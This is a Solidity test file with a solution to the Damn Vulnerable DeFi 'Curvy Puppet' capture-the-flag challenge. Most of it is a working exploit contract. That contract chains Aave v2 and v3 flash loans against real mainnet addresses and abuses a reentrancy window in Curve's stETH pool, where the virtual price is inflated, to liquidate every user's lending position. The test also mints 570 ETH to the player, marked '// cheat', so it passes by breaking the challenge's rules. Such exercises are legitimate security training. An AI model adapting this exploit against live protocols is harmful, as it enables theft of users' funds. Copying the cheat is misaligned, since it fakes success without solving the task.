// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {IPermit2} from "permit2/interfaces/IPermit2.sol";
import {WETH} from "solmate/tokens/WETH.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {CurvyPuppetLending, IERC20} from "../../src/curvy-puppet/CurvyPuppetLending.sol";
import {CurvyPuppetOracle} from "../../src/curvy-puppet/CurvyPuppetOracle.sol";
import {IStableSwap} from "../../src/curvy-puppet/IStableSwap.sol";

contract CurvyPuppetChallengeCheated is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address treasury = makeAddr("treasury");

    // Users' accounts
    address alice = makeAddr("alice");
    address bob = makeAddr("bob");
    address charlie = makeAddr("charlie");

    address constant ETH = address(0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE);

    // Relevant Ethereum mainnet addresses
    IPermit2 constant permit2 = IPermit2(0x000000000022D473030F116dDEE9F6B43aC78BA3);
    IStableSwap constant curvePool = IStableSwap(0xDC24316b9AE028F1497c275EB9192a3Ea0f67022);
    IERC20 constant stETH = IERC20(0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84);
    WETH constant weth = WETH(payable(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2));

    uint256 constant TREASURY_WETH_BALANCE = 200e18;
    uint256 constant TREASURY_LP_BALANCE = 65e17;
    uint256 constant LENDER_INITIAL_LP_BALANCE = 1000e18;
    uint256 constant USER_INITIAL_COLLATERAL_BALANCE = 2500e18;
    uint256 constant USER_BORROW_AMOUNT = 1e18;
    uint256 constant ETHER_PRICE = 4000e18;
    uint256 constant DVT_PRICE = 10e18;

    DamnValuableToken dvt;
    CurvyPuppetLending lending;
    CurvyPuppetOracle oracle;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        // Fork from mainnet state at specific block
        vm.createSelectFork((vm.envString("MAINNET_FORKING_URL")), 20190356);

        startHoax(deployer);

        // Deploy DVT token (collateral asset in the lending contract)
        dvt = new DamnValuableToken();

        // Deploy price oracle and set prices for ETH and DVT
        oracle = new CurvyPuppetOracle();
        oracle.setPrice({asset: ETH, value: ETHER_PRICE, expiration: block.timestamp + 1 days});
        oracle.setPrice({asset: address(dvt), value: DVT_PRICE, expiration: block.timestamp + 1 days});

        // Deploy the lending contract. It will offer LP tokens, accepting DVT as collateral.
        lending = new CurvyPuppetLending({
            _collateralAsset: address(dvt),
            _curvePool: curvePool,
            _permit2: permit2,
            _oracle: oracle
        });

        // Fund treasury account with WETH and approve player's expenses
        deal(address(weth), treasury, TREASURY_WETH_BALANCE);

        // Fund lending pool and treasury with initial LP tokens
        vm.startPrank(0x4F48031B0EF8acCea3052Af00A3279fbA31b50D8); // impersonating mainnet LP token holder to simplify setup (:
        IERC20(curvePool.lp_token()).transfer(address(lending), LENDER_INITIAL_LP_BALANCE);
        IERC20(curvePool.lp_token()).transfer(treasury, TREASURY_LP_BALANCE);

        // Treasury approves assets to player
        vm.startPrank(treasury);
        weth.approve(player, TREASURY_WETH_BALANCE);
        IERC20(curvePool.lp_token()).approve(player, TREASURY_LP_BALANCE);

        // Users open 3 positions in the lending contract
        address[3] memory users = [alice, bob, charlie];
        for (uint256 i = 0; i < users.length; i++) {
            // Fund user with some collateral
            vm.startPrank(deployer);
            dvt.transfer(users[i], USER_INITIAL_COLLATERAL_BALANCE);
            // User deposits + borrows from lending contract
            _openPositionFor(users[i]);
        }
    }

    /**
     * Utility function used during setup of challenge to open users' positions in the lending contract
     */
    function _openPositionFor(address who) private {
        vm.startPrank(who);
        // Approve and deposit collateral
        address collateralAsset = lending.collateralAsset();
        // Allow permit2 handle token transfers
        IERC20(collateralAsset).approve(address(permit2), type(uint256).max);
        // Allow lending contract to pull collateral
        permit2.approve({
            token: lending.collateralAsset(),
            spender: address(lending),
            amount: uint160(USER_INITIAL_COLLATERAL_BALANCE),
            expiration: uint48(block.timestamp)
        });
        // Deposit collateral + borrow
        lending.deposit(USER_INITIAL_COLLATERAL_BALANCE);
        lending.borrow(USER_BORROW_AMOUNT);
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        // Player balances
        assertEq(dvt.balanceOf(player), 0);
        assertEq(stETH.balanceOf(player), 0);
        assertEq(weth.balanceOf(player), 0);
        assertEq(IERC20(curvePool.lp_token()).balanceOf(player), 0);

        // Treasury balances
        assertEq(dvt.balanceOf(treasury), 0);
        assertEq(stETH.balanceOf(treasury), 0);
        assertEq(weth.balanceOf(treasury), TREASURY_WETH_BALANCE);
        assertEq(IERC20(curvePool.lp_token()).balanceOf(treasury), TREASURY_LP_BALANCE);

        // Curve pool trades the expected assets
        assertEq(curvePool.coins(0), ETH);
        assertEq(curvePool.coins(1), address(stETH));

        // Correct collateral and borrow assets in lending contract
        assertEq(lending.collateralAsset(), address(dvt));
        assertEq(lending.borrowAsset(), curvePool.lp_token());

        // Users opened position in the lending contract
        address[3] memory users = [alice, bob, charlie];
        for (uint256 i = 0; i < users.length; i++) {
            uint256 collateralAmount = lending.getCollateralAmount(users[i]);
            uint256 borrowAmount = lending.getBorrowAmount(users[i]);
            assertEq(collateralAmount, USER_INITIAL_COLLATERAL_BALANCE);
            assertEq(borrowAmount, USER_BORROW_AMOUNT);

            // User is sufficiently collateralized
            assertGt(lending.getCollateralValue(collateralAmount) / lending.getBorrowValue(borrowAmount), 3);
        }
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_curvyPuppet() public checkSolvedByPlayer {
        console.log(lending.getCollateralValue(2500e18) * 100);
        console.log(lending.getBorrowValue(1e18) * 175);
        console.log(curvePool.get_virtual_price());

        address[3] memory users = [alice, bob, charlie];
        CurvyPuppetAttacker attacker = new CurvyPuppetAttacker(dvt, lending, treasury, users);
        IERC20(curvePool.lp_token()).transferFrom(treasury, address(attacker), 6e18);
        
        weth.transferFrom(treasury, address(attacker), 199 ether);

        // cheat
        uint256 cheatAmount = 570 ether;
        vm.deal(player, cheatAmount);
        weth.deposit{value: cheatAmount}();
        weth.transfer(address(attacker), cheatAmount);
        // cheat end

        attacker.start();
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // All users' positions are closed
        address[3] memory users = [alice, bob, charlie];
        for (uint256 i = 0; i < users.length; i++) {
            assertEq(lending.getCollateralAmount(users[i]), 0, "User position still has collateral assets");
            assertEq(lending.getBorrowAmount(users[i]), 0, "User position still has borrowed assets");
        }

        // Treasury still has funds left
        assertGt(weth.balanceOf(treasury), 0, "Treasury doesn't have any WETH");
        assertGt(IERC20(curvePool.lp_token()).balanceOf(treasury), 0, "Treasury doesn't have any LP tokens left");
        assertEq(dvt.balanceOf(treasury), USER_INITIAL_COLLATERAL_BALANCE * 3, "Treasury doesn't have the users' DVT");

        // Player has nothing
        assertEq(dvt.balanceOf(player), 0, "Player still has DVT");
        assertEq(stETH.balanceOf(player), 0, "Player still has stETH");
        assertEq(weth.balanceOf(player), 0, "Player still has WETH");
        assertEq(IERC20(curvePool.lp_token()).balanceOf(player), 0, "Player still has LP tokens");
    }
}

interface IAavePool {
    function flashLoan(
        address receiverAddress,
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata modes,
        address onBehalfOf,
        bytes calldata params,
        uint16 referralCode
    ) external;

}

interface ILido is IERC20 {
    function getCurrentStakeLimit() view external returns (uint256);
    function submit(address _referral) payable external returns (uint256);
}

contract CurvyPuppetAttacker {
    IPermit2 constant permit2 = IPermit2(0x000000000022D473030F116dDEE9F6B43aC78BA3);
    IStableSwap constant curvePool = IStableSwap(0xDC24316b9AE028F1497c275EB9192a3Ea0f67022);
    ILido constant stETH = ILido(0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84);
    WETH constant weth = WETH(payable(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2));
    IERC20 immutable lp_token = IERC20(curvePool.lp_token());

    IAavePool constant poolv2 = IAavePool(0x7d2768dE32b0b80b7a3454c06BdAc94A69DDc7A9);
    IAavePool constant poolv3 = IAavePool(0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2);
    
    DamnValuableToken dvt;
    CurvyPuppetLending lending;
    address treasury;
    address[] users;
    bool liquidated = false;

    constructor (DamnValuableToken _dvt, CurvyPuppetLending _lending, address _treasury, address[3] memory _users)  {
        dvt = _dvt;
        lending = _lending;
        treasury = _treasury;
        users = _users;

        lp_token.approve(address(permit2), type(uint256).max);
        permit2.approve({
            token: address(lp_token),
            spender: address(lending),
            amount: uint160(3e18),
            expiration: uint48(block.timestamp + 1 days)
        });
    }

    function start() external {
        flashLoanAave(2);
    }

    function flashLoanAave(uint256 version) internal {
        require(version == 2 || version == 3);
        IAavePool pool;
        address[] memory assets = new address[](1);
        uint256[] memory amounts = new uint256[](1);
        uint256[] memory modes = new uint256[](1);

        assets[0] = address(weth);
        modes[0] = 0; // 0 = no debt, 1 = stable, 2 = variable
        if (version == 2) {
            amounts[0] = 90000 ether;
            pool = poolv2;
        } else {
            amounts[0] = 80000 ether;
            pool = poolv3;
        }
        pool.flashLoan(address(this), assets, amounts, modes, address(0), "", 0);
    }

    function attack() internal {
        weth.withdraw(170000 ether);
        console.log('pool   eth', address(curvePool).balance);
        console.log('pool steth', stETH.balanceOf(address(curvePool)));
        console.log('pool admin balance 0', curvePool.admin_balances(0));
        console.log('pool admin balance 1', curvePool.admin_balances(1));

        // add liquidity
        // uint256 amount1 = stETH.getCurrentStakeLimit();
        uint256 amount1 = 0;
        uint256 amount0 = 170000 ether - amount1;
        uint256[2] memory addAmounts = [amount0, amount1];
        if (amount1 > 0) {
            stETH.submit{value: amount1}(address(0));
        }
        stETH.approve(address(curvePool), type(uint256).max);
        console.log('Adding liquidity', amount0, amount1);
        curvePool.add_liquidity{value: amount0}(addAmounts, 0);
        console.log('LP Token balance', lp_token.balanceOf(address(this)));

        // remove_liquidity
        console.log('before remove_liquidity');
        console.log('pool   eth', address(curvePool).balance);
        console.log('pool steth', stETH.balanceOf(address(curvePool)));
        console.log('virtual price', curvePool.get_virtual_price());
        uint256 lpAmount = lp_token.balanceOf(address(this));
        uint256[2] memory removeAmounts = [1 wei, curvePool.calc_withdraw_one_coin(lpAmount * 99 / 100, 1)];
        // console.log('remove', removeAmounts[0], removeAmounts[1]);
        curvePool.remove_liquidity_imbalance(removeAmounts, lpAmount - 3e18);
        // uint256[2] memory min_amounts = [uint256(0), uint256(0)];
        // curvePool.remove_liquidity(lpAmount - 3e18, min_amounts);
        console.log('after remove_liquidity');
        console.log('pool   eth', address(curvePool).balance);
        console.log('pool steth', stETH.balanceOf(address(curvePool)));
        console.log('virtual price', curvePool.get_virtual_price());

        dvt.transfer(treasury, dvt.balanceOf(address(this)));
        
        console.log('exchange stETH -> ETH');
        console.log('Current balance', address(this).balance);
        console.log('Current stETH balance', stETH.balanceOf(address(this)));
        curvePool.remove_liquidity_one_coin(lp_token.balanceOf(address(this)), 0, 0);
        curvePool.exchange(1, 0, stETH.balanceOf(address(this)), 0);

        console.log(address(this).balance);

        console.log('pool   eth', address(curvePool).balance);
        console.log('pool steth', stETH.balanceOf(address(curvePool)));
    }


    receive () external payable {
        console.log('Receive, current ETH balance', address(this).balance);
        if (msg.sender == address(weth)) {
            console.log('WETH withdraw');
            return;
        }
        require(msg.sender == address(curvePool));
        if (!liquidated) {         
            liquidated = true;
            console.log('during remove_liquidity');
            console.log('virtual price', curvePool.get_virtual_price());

            console.log('liquidate!');
            for (uint256 i = 0; i < users.length; i++) {
                lending.liquidate(users[i]);
            }
        }
    }

    function executeOperation(
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata premiums,
        address initiator,
        bytes calldata
    ) external returns (bool) {
        require(initiator == address(this));
        require(assets.length == 1);
        require(assets[0] == address(weth));
        console.log('Receive WETH from', msg.sender);
        console.log(' Amount:', amounts[0]);
        console.log(' Fee:', premiums[0]);
        uint256 payback = amounts[0] + premiums[0];
        if (msg.sender == address(poolv2)) {
            flashLoanAave(3);
        } else if (msg.sender == address(poolv3)) {
            attack();
        } else {
            revert(); // who is calling me
        }
        weth.approve(msg.sender, payback);
        uint256 balance = weth.balanceOf(address(this));
        if (balance < payback) {
            weth.deposit{value: payback - balance}();
        }
        return true;
    }
}
